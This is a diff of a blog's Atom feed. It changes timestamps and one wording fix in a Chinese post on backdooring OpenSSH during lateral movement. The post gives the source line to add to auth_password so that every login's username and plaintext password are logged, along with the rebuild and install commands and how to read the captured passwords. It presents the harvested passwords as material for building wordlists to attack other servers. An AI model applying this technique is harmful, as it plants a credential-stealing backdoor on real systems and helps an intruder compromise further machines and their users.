@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://reboot.cf/"/>
-  <updated>2018-03-12T02:52:59.000Z</updated>
+  <updated>2018-03-12T02:56:38.000Z</updated>
   <id>http://reboot.cf/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://reboot.cf/2018/03/12/%E9%87%8D%E7%BC%96%E8%AF%91OpebSSH%E8%AE%B0%E5%BD%95%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81/"/>
     <id>http://reboot.cf/2018/03/12/重编译OpebSSH记录登录密码/</id>
     <published>2018-03-12T02:21:37.000Z</published>
-    <updated>2018-03-12T02:52:59.000Z</updated>
+    <updated>2018-03-12T02:56:38.000Z</updated>
     
-    <content type="html"><![CDATA[<p>横向渗透的时候，可以通过重新编译安装添加后门的 OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器<br><a id="more"></a><br>OpenSSH <a href="https://www.openssh.com/portable.html" target="_blank" rel="noopener">源码下载地址</a></p><p>编辑 auth-passwd.c 文件，在 auth_password 函数中添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logit(<span class="string">"username: %s password: %s"</span>, authctxt-&gt;user, password);</span><br></pre></td></tr></table></figure><p>重新编译安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check  --with-md5-passwords --mandir=/usr/share/man</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>有些环境在编译的时候会报缺少xx头文件的错，安装对于的库就可以了，比如</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libssl-dev libz-dev</span><br></pre></td></tr></table></figure><p>查看记录的登录密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/auth.log</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<p>横向渗透的时候，可以通过重新编译安装添加后门的 OpenSSH 记录密码，掌握运维密码组成规律，生成字典去撞其他服务器<br><a id="more"></a><br>OpenSSH <a href="https://www.openssh.com/portable.html" target="_blank" rel="noopener">源码下载地址</a></p><p>编辑 auth-passwd.c 文件，在 auth_password 函数中添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logit(<span class="string">"username: %s password: %s"</span>, authctxt-&gt;user, password);</span><br></pre></td></tr></table></figure><p>重新编译安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --prefix=/usr --sysconfdir=/etc/ssh --without-zlib-version-check  --with-md5-passwords --mandir=/usr/share/man</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>有些环境在编译的时候会报缺少xx头文件的错，安装对应的库就可以了，比如缺少 zlib.h</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libssl-dev libz-dev</span><br></pre></td></tr></table></figure><p>查看记录的登录密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/<span class="built_in">log</span>/auth.log</span><br></pre></td></tr></table></figure>]]></content>
     
     <summary type="html">
     
